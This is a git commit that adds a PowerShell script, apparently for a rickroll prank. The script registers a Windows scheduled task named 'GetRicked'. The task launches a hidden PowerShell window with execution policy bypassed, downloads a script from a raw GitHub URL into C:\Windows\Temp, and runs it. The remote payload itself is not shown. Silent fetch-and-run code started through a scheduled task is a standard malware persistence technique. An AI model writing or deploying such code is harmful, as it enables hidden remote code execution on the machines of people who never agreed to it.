89a31e6bca28938541882564b84222af09445afe
CyberSpooon <137320651+CyberSpooon@users.noreply.github.com>
2025-03-31 21:02:03 -0400

    added the rickoning

---
+++ scheduletherickoning.ps1
@@ -0,0 +1,8 @@
+$runTime = Get-Date "2025-03-31 9:05"
+
+$taskName = "GetRicked"
+
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden iwr -uri 'https://raw.githubusercontent.com/CyberSpooon/GetRicked/main/GetRicked.ps1' -outfile 'C:\Windows\Temp\getricked.ps1'; & 'C:\Windows\Temp\getricked.ps1'"
+
+$trigger = New-ScheduledTaskTrigger -Once -At $runTime
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "Get rickity rickity ricked son!"
